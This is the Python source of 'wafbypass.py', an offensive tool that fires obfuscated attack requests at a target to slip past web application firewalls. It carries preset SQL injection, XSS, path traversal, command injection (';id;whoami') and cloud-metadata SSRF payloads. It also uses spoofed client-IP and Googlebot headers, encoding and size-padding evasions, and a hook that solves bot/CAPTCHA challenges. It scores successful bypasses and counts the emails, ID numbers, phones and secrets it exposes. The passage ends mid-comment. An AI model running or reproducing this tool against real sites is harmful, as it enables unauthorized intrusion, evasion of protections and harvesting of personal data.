#!/usr/bin/env python3
"""wafbypass.py - 403/WAF bypass sweep engine over raw sockets.

The request-target is built by hand and written to the socket unchanged, so
%2e, //, ..;/, %00 and backslashes reach the WAF/origin exactly as typed.
No requests/urllib transport is used against the target; urllib.parse only
parses the URL supplied by the operator.

Baseline: the un-obfuscated attack for the selected mode - a GET with the
raw payload injected into the query for payload-bearing modes (encoding/all),
the canonical urlencoded POST for body mode, otherwise the URL as given. A
baseline that already answers 2xx means nothing is blocked, so the run prints
an "[i] baseline already returns 2xx" line and no BYPASS can be proven.

Verdicts per response (relative to the baseline and a soft-404 control):
  ERROR     no response
  BLOCKED   same status as baseline AND body similarity >= 0.95
  NOTFOUND  same status as control  AND body similarity >= 0.90
  BYPASS    2xx/3xx, non-empty body, similarity to baseline < 0.90 and the
            response does not match the control signature
  DIFF      anything else
  UNSTABLE  a BYPASS/DIFF candidate whose re-send (same bytes, fresh
            connection) changed status or body hash; never reported as BYPASS

Profiles select the size-family limits (PROFILE_LIMITS); the size family
pairs "payload at offset L-16" against "payload at offset 0" and only calls
the padded request a BYPASS when the offset-0 control is blocked.

Exit: 0 if at least one BYPASS, 1 if none, 2 on fatal error.
"""
from __future__ import annotations

import argparse
import base64
import difflib
import hashlib
import json
import os
import random
import re
import socket
import ssl
import string
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlsplit

import h2

MAX_BODY = 1024 * 1024
MAX_HEADER = 64 * 1024
MAX_VARIANTS = 600
SNIPPET_LEN = 60
SIM_CHARS = 4000

UA_DEFAULT = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
UA_GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

VERSION = "0.2.0"
BANNER = r"""
___       ______________________ ________________
__ |     / /__    |__  ____/_  // /_  __ \_|__  /___  __
__ | /| / /__  /| |_  /_   _  // /_  / / /__/_ <__  |/_/
__ |/ |/ / _  ___ |  __/   /__  __/ /_/ /____/ /__>  <
____/|__/  /_/  |_/_/        /_/  \____/ /____/ /_/|_|
"""

PRESETS = {
    "sqli": "' UNION SELECT 1,2,3-- -",
    "xss": "<script>alert(1)</script>",
    "lfi": "../../../../etc/passwd",
    "rce": ";id;whoami",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "ssti": "{{7*7}}${7*7}",
}
DEFAULT_PAYLOAD = "' OR 1=1--"

# Per-vendor response-size limits used by the size family (bytes). Each limit L
# builds a body whose payload starts at offset L-16 plus an offset-0 control.
PROFILE_LIMITS = {
    "generic": [8192, 65536],
    "cloudflare": [131072, 1048576],
    "aws": [8192, 16384, 65536],
    "akamai": [131072],
    "imperva": [131072],
    "f5": [131072],
    "azure": [131072],
    "gcp": [65536],
    "modsec": [131072],
    "wordpress": [131072],
}


# --------------------------------------------------------------------------
# target / request
# --------------------------------------------------------------------------
class Target(object):
    __slots__ = ("scheme", "host", "port", "host_header", "path", "query")

    def __init__(self, scheme, host, port, host_header, path, query):
        self.scheme = scheme
        self.host = host
        self.port = port
        self.host_header = host_header
        self.path = path
        self.query = query

    @property
    def target(self):
        return self.path + ("?" + self.query if self.query else "")


def parse_url(url):
    if "://" not in url:
        url = "http://" + url
    p = urlsplit(url)
    scheme = p.scheme.lower()
    if scheme not in ("http", "https"):
        raise ValueError("unsupported scheme: %s" % scheme)
    host = p.hostname
    if not host:
        raise ValueError("no host in URL")
    try:
        port = p.port
    except ValueError:
        raise ValueError("bad port in URL")
    if port is None:
        port = 443 if scheme == "https" else 80
    host_header = p.netloc.rsplit("@", 1)[-1]
    path = p.path or "/"
    return Target(scheme, host, port, host_header, path, p.query)


class Response(object):
    __slots__ = ("status", "headers", "body", "error", "cookies", "hops")

    def __init__(self, status, headers, body, error=None, cookies=None, hops=0):
        self.status = status
        self.headers = headers
        self.body = body
        self.error = error
        self.cookies = cookies or []
        self.hops = hops

    def text(self):
        return self.body[:SIM_CHARS * 4].decode("utf-8", "replace")[:SIM_CHARS]

    @property
    def length(self):
        return len(self.body)


def wire_safe(target):
    """Escape only octets that are illegal inside an HTTP request-target.

    Percent-encoded sequences, %2e, //, ..;/, backslashes and %00 pass through
    untouched; raw spaces and controls get %XX so the request line stays
    parseable instead of being rejected with 400 by the server.
    """
    out = []
    for ch in target:
        o = ord(ch)
        if o < 0x21 or o == 0x7F:
            out.append("%%%02X" % o)
        elif o > 0x7E:
            out.extend("%%%02X" % b for b in ch.encode("utf-8", "replace"))
        else:
            out.append(ch)
    return "".join(out)


def build_request(t, method, target, headers=None, body=None, ua=UA_DEFAULT):
    hdrs = [
        ("Host", t.host_header),
        ("User-Agent", ua),
        ("Accept", "*/*"),
        ("Accept-Encoding", "identity"),
        ("Connection", "close"),
    ]
    if body is not None:
        if not (headers or {}).get("Transfer-Encoding"):
            hdrs.append(("Content-Length", str(len(body))))
    for k, v in (headers or {}).items():
        hdrs.append((k, v))
    out = ["%s %s HTTP/1.1" % (method, wire_safe(target))]
    for k, v in hdrs:
        out.append("%s: %s" % (k, v))
    raw = ("\r\n".join(out) + "\r\n\r\n").encode("latin-1", "replace")
    if body:
        raw += body
    return raw


def _recv_all(sock, max_body=MAX_BODY):
    chunks = []
    total = 0
    limit = max_body + MAX_HEADER
    while total < limit:
        try:
            buf = sock.recv(65536)
        except socket.timeout:
            break
        except OSError:
            break
        if not buf:
            break
        chunks.append(buf)
        total += len(buf)
    return b"".join(chunks)


def _dechunk(data):
    out = []
    pos = 0
    n = len(data)
    while pos < n:
        eol = data.find(b"\r\n", pos)
        if eol < 0:
            break
        size_line = data[pos:eol].split(b";")[0].strip()
        if not size_line:
            pos = eol + 2
            continue
        try:
            size = int(size_line, 16)
        except ValueError:
            break
        pos = eol + 2
        if size == 0:
            break
        out.append(data[pos:pos + size])
        pos += size + 2
    return b"".join(out)


def parse_response(data, max_body=MAX_BODY):
    if not data:
        return Response(0, {}, b"", "empty response")
    sep = data.find(b"\r\n\r\n")
    hdr_end = 4
    if sep < 0:
        sep = data.find(b"\n\n")
        hdr_end = 2
    if sep < 0:
        return Response(0, {}, b"", "no header terminator")
    head = data[:sep].decode("latin-1", "replace")
    body = data[sep + hdr_end:]
    lines = head.splitlines()
    if not lines:
        return Response(0, {}, b"", "empty status line")
    parts = lines[0].split()
    if len(parts) < 2 or not parts[1].isdigit():
        return Response(0, {}, b"", "bad status line: %r" % lines[0][:80])
    status = int(parts[1])
    headers = {}
    cookies = []
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            key = k.strip().lower()
            headers[key] = v.strip()
            if key == "set-cookie":
                cookies.append(v.strip())
    te = headers.get("transfer-encoding", "").lower()
    if "chunked" in te:
        body = _dechunk(body)
    elif "content-length" in headers:
        try:
            cl = int(headers["content-length"])
            body = body[:cl]
        except ValueError:
            pass
    if len(body) > max_body:
        body = body[:max_body]
    return Response(status, headers, body, cookies=cookies)


def _tls_context(opts, alpn=None):
    ctx = ssl._create_unverified_context()
    if opts.get("ciphers"):
        ctx.set_ciphers(opts["ciphers"])
    lo = opts.get("tls_min")
    hi = opts.get("tls_max")
    if lo:
        ctx.minimum_version = getattr(ssl.TLSVersion, lo)
    if hi:
        ctx.maximum_version = getattr(ssl.TLSVersion, hi)
    proto = alpn if alpn is not None else opts.get("alpn")
    if proto:
        ctx.set_alpn_protocols(proto)
    return ctx


def send_raw(t, raw, timeout, opts=None):
    opts = opts or {}
    sock = None
    try:
        sock = socket.create_connection((t.host, t.port), timeout=timeout)
        sock.settimeout(timeout)
        if t.scheme == "https":
            sock = _tls_context(opts).wrap_socket(sock, server_hostname=t.host)
        sock.sendall(raw)
        data = _recv_all(sock, opts.get("max_body", MAX_BODY))
    except (socket.timeout, OSError, ssl.SSLError) as exc:
        return Response(0, {}, b"", "%s: %s" % (type(exc).__name__, exc))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    return parse_response(data, opts.get("max_body", MAX_BODY))


def send_h2(t, v, headers, timeout, opts):
    profile = v.get("h2_profile") or opts["http2"]
    order = v.get("h2_order")
    priority = v.get("h2_priority")
    hdrs = {"Host": t.host_header,
            "User-Agent": opts.get("ua", UA_DEFAULT), "Accept": "*/*"}
    hdrs.update(headers)
    sock = None
    try:
        sock = socket.create_connection((t.host, t.port), timeout=timeout)
        sock.settimeout(timeout)
        if t.scheme == "https":
            ctx = _tls_context(opts, ["h2"])
            sock = ctx.wrap_socket(sock, server_hostname=t.host)
            if sock.selected_alpn_protocol() != "h2":
                return Response(0, {}, b"",
                                "ALPN negotiated %r, not h2"
                                % sock.selected_alpn_protocol())
        status, hlist, body, err = h2.request(
            sock, v["method"], wire_safe(v["target"]), hdrs, v["body"],
            scheme=t.scheme, profile=profile, order=order, priority=priority)
    except (socket.timeout, OSError, ssl.SSLError, ValueError) as exc:
        return Response(0, {}, b"", "%s: %s" % (type(exc).__name__, exc))
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    if err:
        return Response(0, {}, b"", err)
    body = body[:opts.get("max_body", MAX_BODY)]
    out_headers = {}
    cookies = []
    for name, value in hlist:
        key = name.lower()
        out_headers[key] = value
        if key == "set-cookie":
            cookies.append(value)
    return Response(status, out_headers, body, cookies=cookies)


def _jar_header(jar):
    if not jar:
        return None
    return "; ".join("%s=%s" % (k, v) for k, v in jar.items())


def _jar_update(jar, cookies, lock):
    for raw in cookies or ():
        pair = raw.split(";", 1)[0].strip()
        if "=" not in pair:
            continue
        name, value = pair.split("=", 1)
        name = name.strip()
        if not name:
            continue
        with lock:
            jar[name] = value.strip()


def _send_once(t, v, timeout, opts, cookie_hdr):
    headers = dict(v["headers"])
    if cookie_hdr and not any(k.lower() == "cookie" for k in headers):
        headers["Cookie"] = cookie_hdr
    if opts["http2"] != "off":
        return send_h2(t, v, headers, timeout, opts)
    raw = build_request(t, v["method"], v["target"], headers, v["body"],
                        opts.get("ua", UA_DEFAULT))
    return send_raw(t, raw, timeout, opts)


def _same_host(t, url):
    try:
        nt = parse_url(url)
    except ValueError:
        return None
    if nt.host != t.host:
        return None
    return nt


def fetch(t, v, timeout, delay, opts, jar=None, jar_lock=None):
    if delay:
        time.sleep(delay)
    opts = opts or {}
    jar_lock = jar_lock or threading.Lock()
    cookie_hdr = _jar_header(jar) if jar is not None else None
    resp = _send_once(t, v, timeout, opts, cookie_hdr)
    if jar is not None:
        _jar_update(jar, resp.cookies, jar_lock)
    if not opts.get("follow"):
        return resp
    from urllib.parse import urljoin
    hops = 0
    cur_t, cur_v = t, v
    while (resp.status in (301, 302, 303, 307, 308)
           and hops < opts["follow"] and resp.headers.get("location")):
        nt = _same_host(t, urljoin("%s://%s" % (t.scheme, t.host_header),
                                   resp.headers["location"]))
        if nt is None:
            break
        keep = resp.status in (307, 308)
        cur_t = nt
        cur_v = mk(cur_v["mode"], cur_v["name"] + "-hop",
                   cur_v["method"] if keep else "GET", nt.target,
                   headers=cur_v["headers"],
                   body=cur_v["body"] if keep else None)
        cookie_hdr = _jar_header(jar) if jar is not None else None
        resp = _send_once(cur_t, cur_v, timeout, opts, cookie_hdr)
        if jar is not None:
            _jar_update(jar, resp.cookies, jar_lock)
        hops += 1
        resp.hops = hops
    return resp


# --------------------------------------------------------------------------
# verdicts
# --------------------------------------------------------------------------
def similarity(a, b):
    sa = a[:SIM_CHARS]
    sb = b[:SIM_CHARS]
    if not sa and not sb:
        return 1.0
    return difflib.SequenceMatcher(None, sa, sb).ratio()


CHALLENGE_MARKERS = (
    b"just a moment", b"cf-chl", b"checking your browser",
    b"enable javascript and cookies", b"attention required",
    b"unusual traffic", b"px-captcha", b"captcha-delivery",
    b"verify you are human", b"ddos-guard", b"_incapsula_resource",
    b"please wait while we verify", b"turnstile",
)


def challenge_kind(resp):
    """Return a marker string when the response is a JS/CAPTCHA challenge."""
    if resp.status == 0:
        return None
    if resp.headers.get("cf-mitigated"):
        return "cf-mitigated"
    if resp.headers.get("x-amzn-waf-action") == "captcha":
        return "x-amzn-waf-action"
    if resp.status in (403, 429, 503):
        low = resp.body[:200000].lower()
        for marker in CHALLENGE_MARKERS:
            if marker in low:
                return marker.decode("latin-1")
    return None


def classify(resp, base, ctrl):
    if resp.status == 0:
        return "ERROR"
    if challenge_kind(resp):
        return "CHALLENGE"
    txt = resp.text()
    sim_base = similarity(txt, base.text())
    if resp.status == base.status and sim_base >= 0.95:
        return "BLOCKED"
    sim_ctrl = similarity(txt, ctrl.text())
    if resp.status == ctrl.status and sim_ctrl >= 0.90:
        return "NOTFOUND"
    if (200 <= resp.status < 400 and len(resp.body) > 0 and sim_base < 0.90
            and not (resp.status == ctrl.status and sim_ctrl >= 0.90)):
        return "BYPASS"
    return "DIFF"


def snippet(resp):
    if resp.status == 0:
        return resp.error or "no response"
    txt = " ".join(resp.text().split())
    if not txt:
        return "<empty body>"
    if len(txt) > SNIPPET_LEN:
        txt = txt[:SNIPPET_LEN] + "..."
    return txt


EMAIL_RE = re.compile(rb"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
NIK_RE = re.compile(rb"\b\d{16}\b")
PHONE_RE = re.compile(rb"(?:\+62|62|0)8[1-9]\d{6,11}\b")
SENSITIVE = (b"password", b"passwd", b"api_key", b"apikey", b"secret",
             b"token", b"nik", b"npwp", b"creditcard", b"confidential",
             b"flag{")
FINDING_MARKERS = (b"admin", b"dashboard", b"user list", b"users",
                   b"confidential", b"internal", b"private", b"flag{")


def finding(resp):
    """What a bypassed response exposes: title, text, PII-ish counts, markers."""
    body = resp.body
    low = body.lower()
    title = ""
    match = re.search(rb"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if match:
        title = " ".join(match.group(1).decode("utf-8", "replace").split())[:90]
    text = re.sub(rb"<script.*?</script>|<style.*?</style>", b" ", body,
                  flags=re.I | re.S)
    text = re.sub(rb"<[^>]+>", b" ", text)
    text = " ".join(text.decode("utf-8", "replace").split())
    return {
        "title": title,
        "snippet": text[:160],
        "emails": len(set(EMAIL_RE.findall(body))),
        "niks": len(set(NIK_RE.findall(body))),
        "phones": len(set(PHONE_RE.findall(body))),
        "links": len(re.findall(rb"href=", low)),
        "sensitive": [m.decode() for m in SENSITIVE if m in low][:8],
        "markers": [m.decode() for m in FINDING_MARKERS if m in low][:8],
    }


# --------------------------------------------------------------------------
# variants
# --------------------------------------------------------------------------
def toggle_case(path):
    return path.swapcase()


def inject_query(query, param, value):
    pairs = query.split("&") if query else []
    out = []
    found = False
    for pair in pairs:
        key = pair.split("=", 1)[0]
        if key == param:
            out.append(param + "=" + value)
            found = True
        else:
            out.append(pair)
    if not found:
        out.append(param + "=" + value)
    return "&".join(out)


def mk(mode, name, method, target, headers=None, body=None, **extra):
    out = {"mode": mode, "name": name, "method": method,
           "target": target, "headers": headers or {}, "body": body}
    out.update(extra)
    return out


def path_variants(t):
    p = t.path
    q = ("?" + t.query) if t.query else ""
    bare = p.lstrip("/")
    items = [
        ("double-slash", "//" + bare),
        ("dot-segment", "/./" + bare),
        ("pct-dot", "/%2e/" + bare),
        ("double-pct-dot", "/%252e/" + bare),
        ("semicolon-suffix", p + ";"),
        ("dotdot-semicolon", p + "/..;/"),
        ("trailing-dot", p + "/."),
        ("trailing-slash", p + "/"),
        ("space-suffix", p + "%20"),
        ("tab-suffix", p + "%09"),
        ("nul-suffix", p + "%00"),
        ("nul-png", p + "%00.png"),
        ("slash-to-pct2f", p.replace("/", "%2f")),
        ("slash-to-pct252f", p.replace("/", "%252f")),
        ("backslash", "/" + "\\" + bare),
        ("backslash-pct", "/%5c" + bare),
        ("case-toggle", toggle_case(p)),
        ("dotdot-prefix", "/foo/../" + bare),
    ]
    return [mk("path", name, "GET", path + q) for name, path in items]


def header_variants(t):
    tgt = t.target
    origin = "%s://%s" % (t.scheme, t.host_header)
    items = [
        ("xff-127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
        ("xff-localhost", {"X-Forwarded-For": "localhost"}),
        ("x-forwarded-host", {"X-Forwarded-Host": t.host_header}),
        ("x-original-url", {"X-Original-URL": tgt}),
        ("x-rewrite-url", {"X-Rewrite-URL": tgt}),
        ("x-real-ip", {"X-Real-IP": "127.0.0.1"}),
        ("x-client-ip", {"X-Client-IP": "127.0.0.1"}),
        ("x-remote-ip", {"X-Remote-IP": "127.0.0.1"}),
        ("x-remote-addr", {"X-Remote-Addr": "127.0.0.1"}),
        ("true-client-ip", {"True-Client-IP": "127.0.0.1"}),
        ("cf-connecting-ip", {"CF-Connecting-IP": "127.0.0.1"}),
        ("forwarded-for", {"Forwarded": "for=127.0.0.1"}),
        ("x-http-method-override", {"X-HTTP-Method-Override": "GET"}),
        ("x-method-override", {"X-Method-Override": "GET"}),
        ("ua-googlebot", {"User-Agent": UA_GOOGLEBOT}),
        ("referer-same-origin", {"Referer": origin + t.path}),
    ]
    return [mk("header", name, "GET", tgt, headers=h) for name, h in items]


def method_variants(t):
    out = []
    for m in ("GET", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE", "POST"):
        out.append(mk("method", "method-" + m, m, t.target))
    out.append(mk("method", "override-post", "POST", t.target,
                  headers={"X-HTTP-Method-Override": "GET"}))
    return out


def body_variants(t, param, payload):
    pct = quote(payload, safe="")
    form = ("%s=%s" % (param, pct)).encode("latin-1")
    boundary = "----wafbypass7f3a9c"
    multipart = (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n--%s--\r\n"
        % (boundary, param, payload, boundary)
    ).encode("latin-1")
    chunked = b"".join(
        [("%x\r\n" % len(form)).encode(), form, b"\r\n", b"0\r\n\r\n"]
    )
    js = json.dumps({param: payload}).encode("latin-1")
    items = [
        ("urlencoded", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"}, form),
        ("json", "POST", t.target,
         {"Content-Type": "application/json"}, js),
        ("multipart", "POST", t.target,
         {"Content-Type": "multipart/form-data; boundary=" + boundary}, multipart),
        ("chunked", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded",
          "Transfer-Encoding": "chunked"}, chunked),
        ("hpp", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("%s=1&%s=%s" % (param, param, pct)).encode("latin-1")),
        ("semicolon", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("%s=1;%s=%s" % (param, param, pct)).encode("latin-1")),
        ("append-param", "POST", t.target,
         {"Content-Type": "application/x-www-form-urlencoded"},
         ("x=1&%s=%s" % (param, pct)).encode("latin-1")),
    ]
    return [mk("body", name, m, tgt, headers=h, body=b) for name, m, tgt, h, b in items]


def encode_payloads(payload):
    raw = quote(payload, safe="!$&'()*+,-./:;=?@_~")
    url = quote(payload, safe="")
    dbl = quote(url, safe="")
    uxxxx = "".join("%%u%04x" % ord(c) for c in payload)
    hexs = "0x" + payload.encode("latin-1", "replace").hex()
    comment = payload.replace(" ", "/**/")
    mysql = payload
    for kw in ("union", "select", "UNION", "SELECT"):
        mysql = mysql.replace(kw, "/*!50000%s*/" % kw)
    case = payload.swapcase()
    plus = payload.replace(" ", "+")
    tab = payload.replace(" ", "%09")
    b64 = quote(base64.b64encode(payload.encode("latin-1", "replace")).decode(), safe="=")
    html = "".join("&#x%x;" % ord(c) for c in payload)
    return [
        ("raw", raw),
        ("url", url),
        ("double-url", dbl),
        ("uxxxx", uxxxx),
        ("hex", hexs),
        ("comment-space", comment),
        ("mysql-comment", mysql),
        ("case-toggle", case),
        ("plus-space", plus),
        ("tab-space", tab),
        ("base64", b64),
        ("html-entity", html),
    ]


def encoding_variants(t, param, payload):
    out = []
    for name, enc in encode_payloads(payload):
        q = inject_query(t.query, param, enc)
        out.append(mk("encoding", "enc-" + name, "GET", t.path + "?" + q))
    return out


def octal_escape(payload):
    return "".join("\\%03o" % b for b in payload.encode("latin-1", "replace"))


def cookie_variants(t, payload):
    """Plain vs phantom-octal vs duplicate cookie, all reaching the same app."""
    return [
        mk("cookie", "cookie-plain", "GET", t.target,
           headers={"Cookie": "q=" + payload}),
        mk("cookie", "cookie-phantom-octal", "GET", t.target,
           headers={"Cookie": '$Version=1; q="' + octal_escape(payload) + '"'}),
        mk("cookie", "cookie-duplicate", "GET", t.target,
           headers={"Cookie": "q=1; q=" + payload}),
    ]


def ctype_variants(t, param, payload):
    """Same payload, four Content-Type framings (parser differential)."""
    pct = quote(payload, safe="")
    boundary = "----wafbypassctype7f3a"
    multipart = (
        "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n--%s--\r\n"
        % (boundary, param, payload, boundary)
    ).encode("latin-1", "replace")
    items = [
        ("ctype-json", "application/json",
         json.dumps({param: payload}).encode("latin-1")),
        ("ctype-urlencoded", "application/x-www-form-urlencoded",
         ("%s=%s" % (param, pct)).encode("latin-1")),
        ("ctype-multipart", "multipart/form-data; boundary=" + boundary,
         multipart),
        ("ctype-text", "text/plain; charset=utf-8",
         payload.encode("latin-1", "replace")),
    ]
    return [mk("ctype", name, "POST", t.target, {"Content-Type": ctype}, body)
            for name, ctype, body in items]


def size_variants(t, profile, payload):
    """Payload at offset L-16 vs offset 0, one padded/control pair per limit."""
    pb = payload.encode("latin-1", "replace")
    out = []
    for limit in PROFILE_LIMITS[profile]:
        filler = b"A" * max(0, limit - 16)
        key = "size-%d" % limit
        out.append(mk("size", key, "POST", t.target,
                      {"Content-Type": "application/x-www-form-urlencoded"},
                      filler + pb, pair=key, role="padded"))
        out.append(mk("size", key + "-ctl", "POST", t.target,
                      {"Content-Type": "application/x-www-form-urlencoded"},
                      pb + filler, pair=key, role="ctl"))
    return out


# Escalation level per variant: 1 = single obvious rewrite, 2 = one parser
# differential, 3 = double layer, 4 = null/destructive framing and size windows.
# Variants not listed default to level 2.
LEVELS = {
    "double-slash": 1, "dot-segment": 1, "trailing-slash": 1, "case-toggle": 1,
    "pct-dot": 2, "semicolon-suffix": 2, "trailing-dot": 2, "space-suffix": 2,
    "tab-suffix": 2, "slash-to-pct2f": 2, "backslash": 2, "backslash-pct": 2,
    "dotdot-prefix": 2, "double-pct-dot": 3, "slash-to-pct252f": 3,
    "dotdot-semicolon": 4, "nul-suffix": 4, "nul-png": 4,

    "xff-127.0.0.1": 1, "ua-googlebot": 1, "referer-same-origin": 1,
    "x-forwarded-host": 1, "xff-localhost": 2, "x-original-url": 2,
    "x-rewrite-url": 2, "x-http-method-override": 2, "x-method-override": 2,
    "true-client-ip": 3, "cf-connecting-ip": 3, "forwarded-for": 3,
    "x-real-ip": 4, "x-client-ip": 4, "x-remote-ip": 4, "x-remote-addr": 4,

    "method-GET": 1, "method-HEAD": 1, "method-OPTIONS": 1,
    "method-PUT": 2, "method-PATCH": 2, "method-POST": 2,
    "method-TRACE": 3, "override-post": 4,

    "urlencoded": 1, "json": 2, "append-param": 2,
    "multipart": 3, "hpp": 3, "semicolon": 3, "chunked": 4,

    "enc-raw": 1, "enc-url": 1, "enc-double-url": 2, "enc-case-toggle": 2,
    "enc-plus-space": 2, "enc-tab-space": 2, "enc-comment-space": 2,
    "enc-uxxxx": 3, "enc-hex": 3, "enc-mysql-comment": 3,
    "enc-base64": 4, "enc-html-entity": 4,

    "cookie-plain": 1, "cookie-duplicate": 3, "cookie-phantom-octal": 4,

    "ctype-urlencoded": 1, "ctype-json": 2, "ctype-text": 2, "ctype-multipart": 3,
}


def variant_level(v):
    if v["mode"] == "size":
        return 4
    if v["mode"] == "h2":
        return 1
    return LEVELS.get(v["name"], 2)


BENIGN = "wafbypass_probe_9f3a"


def twin_variant(v, t, param, profile):
    """Same transform, harmless payload; None when the variant has no payload."""
    mode = v["mode"]
    if mode == "encoding":
        cands = encoding_variants(t, param, BENIGN)
    elif mode == "cookie":
        cands = cookie_variants(t, BENIGN)
    elif mode == "ctype":
        cands = ctype_variants(t, param, BENIGN)
    elif mode == "body":
        cands = body_variants(t, param, BENIGN)
    elif mode == "size":
        cands = size_variants(t, profile, BENIGN)
    else:
        return None
    for cand in cands:
        if cand["name"] == v["name"]:
            return cand
    return None


def h2_variants(t):
    """Same request, different client fingerprints; each opens a connection."""
    out = []
    for order in ("chrome", "firefox", "safari"):
        out.append(mk("h2", "h2-order-" + order, "GET", t.target,
                      h2_order=order))
    for profile in ("chrome", "firefox", "safari", "nghttp2", "plain"):
        out.append(mk("h2", "h2-profile-" + profile, "GET", t.target,
                      h2_profile=profile))
    out.append(mk("h2", "h2-priority-tree", "GET", t.target,
                  h2_priority="chrome"))
    out.append(mk("h2", "h2-priority-none", "GET", t.target,
                  h2_priority="none"))
    return out


def build_variants(t, modes, param, payload, profile, level=4):
    out = []
    if "path" in modes:
        out += path_variants(t)
    if "header" in modes:
        out += header_variants(t)
    if "method" in modes:
        out += method_variants(t)
    if "body" in modes:
        out += body_variants(t, param, payload)
    if "encoding" in modes:
        out += encoding_variants(t, param, payload)
    if "cookie" in modes:
        out += cookie_variants(t, payload)
    if "ctype" in modes:
        out += ctype_variants(t, param, payload)
    if "size" in modes:
        out += size_variants(t, profile, payload)
    if "h2" in modes:
        out += h2_variants(t)
    return [v for v in out if variant_level(v) <= level][:MAX_VARIANTS]


# --------------------------------------------------------------------------
# run
# --------------------------------------------------------------------------
def fmt_bytes(n):
    return "%d" % n


def solve_challenge(url, python, timeout, refresh=False):
    """Run challenge.py under the solver venv and return (data, error)."""
    worker = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "challenge.py")
    cmd = [python, worker, url, str(timeout)]
    if refresh:
        cmd.append("--refresh")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout + 180)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return None, "%s: %s" % (type(exc).__name__, exc)
    line = ""
    for candidate in reversed(proc.stdout.splitlines()):
        if candidate.strip().startswith("{"):
            line = candidate.strip()
            break
    if not line:
        err = (proc.stderr.strip().splitlines() or ["no JSON from solver"])[-1]
        return None, err
    try:
        data = json.loads(line)
    except ValueError as exc:
        return None, "bad solver JSON: %s" % exc
    if data.get("error"):
        return None, data["error"]
    return data, None


def run(args):
    t = parse_url(args.url)
    if args.preset:
        payload = PRESETS[args.preset]
    elif args.payload is not None:
        payload = args.payload
    else:
        payload = DEFAULT_PAYLOAD

    if args.mode == "all":
        modes = ["path", "header", "method", "body", "encoding",
                 "cookie", "ctype", "size"]
        if args.http2 != "off":
            modes.append("h2")
    else:
        modes = [args.mode]
    if args.mode == "h2" and args.http2 == "off":
        sys.stderr.write("[x] --mode h2 needs --http2 <profile>\n")
        return None, 2

    timeout = max(0.5, float(args.timeout))
    threads = max(1, int(args.threads))
    delay = max(0.0, float(args.delay or 0.0))
    opts = {
        "http2": args.http2,
        "follow": max(0, int(args.follow)),
        "max_body": max(4096, int(args.max_body)),
        "ciphers": args.ciphers or None,
        "tls_min": args.tls_min,
        "tls_max": args.tls_max,
        "alpn": [args.alpn] if args.alpn else None,
    }
    jar = {} if args.cookies else None
    jar_lock = threading.Lock()
    challenge = None
    if args.solve_challenge:
        solver_py = args.solver_python
        if not solver_py:
            local_py = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    ".venv", "bin", "python")
            solver_py = local_py if os.path.exists(local_py) else sys.executable
        solved, err = solve_challenge(args.url, solver_py, args.solver_timeout,
                                      args.solver_refresh)
        if solved is None:
            sys.stderr.write("[x] challenge solver failed: %s\n" % err)
            return None, 2
        opts["ua"] = solved.get("user_agent") or UA_DEFAULT
        jar = dict(solved.get("cookies") or {})
        challenge = {
            "status": solved.get("status"),
            "title": solved.get("title"),
            "cookies": len(jar),
            "user_agent": opts["ua"],
            "challenge_page": solved.get("challenge"),
        }

    # Baseline = the un-obfuscated attack against the same endpoint, so a
    # 2xx baseline means nothing is blocked and no bypass can be proven.
    # Body-shaped modes use the canonical urlencoded POST; cookie mode uses
    # the plain cookie; payload-in-query modes inject the raw payload;
    # other modes use the URL as given.
    if args.mode in ("body", "ctype", "size"):
        base_v = mk("base", "baseline", "POST", t.target,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=("%s=%s" % (args.param, quote(payload, safe=""))).encode("latin-1"))
    elif args.mode == "cookie":
        base_v = mk("base", "baseline", "GET", t.target,
                    headers={"Cookie": "q=" + payload})
    elif args.mode in ("encoding", "all"):
        base_q = inject_query(t.query, args.param,
                              quote(payload, safe="!$&'()*+,-./:;=?@_~"))
        base_v = mk("base", "baseline", "GET", t.path + "?" + base_q)
    else:
        base_v = mk("base", "baseline", "GET", t.target)

    base = fetch(t, base_v, timeout, 0.0, opts, jar, jar_lock)
    if base.status == 0:
        sys.stderr.write("[x] baseline failed: %s\n" % (base.error or "no response"))
        return None, 2

    ctrl_path = "/" + "".join(random.choice(string.ascii_lowercase + string.digits)
                              for _ in range(12))
    ctrl = fetch(t, mk("ctrl", "control", "GET", ctrl_path), timeout, 0.0,
                 opts, jar, jar_lock)

    variants = build_variants(t, modes, args.param, payload, args.profile,
                              args.level)
    if not variants:
        sys.stderr.write("[x] no variants generated\n")
        return None, 2

    results = [None] * len(variants)

    def work(idx_v):
        idx, v = idx_v
        resp = fetch(t, v, timeout, delay, opts, jar, jar_lock)
        results[idx] = (v, resp)

    with ThreadPoolExecutor(max_workers=threads) as pool:
        list(pool.map(work, list(enumerate(variants))))

    rows = []
    for v, resp in results:
        verdict = classify(resp, base, ctrl)
        rows.append({
            "mode": v["mode"],
            "variant": v["name"],
            "method": v["method"],
            "status": resp.status,
            "bytes": resp.length,
            "verdict": verdict,
            "impact": None,
            "finding": finding(resp) if verdict == "BYPASS" else None,
            "snippet": snippet(resp),
            "error": resp.error,
        })

    # size differential: only call it a bypass when the offset-0 control is
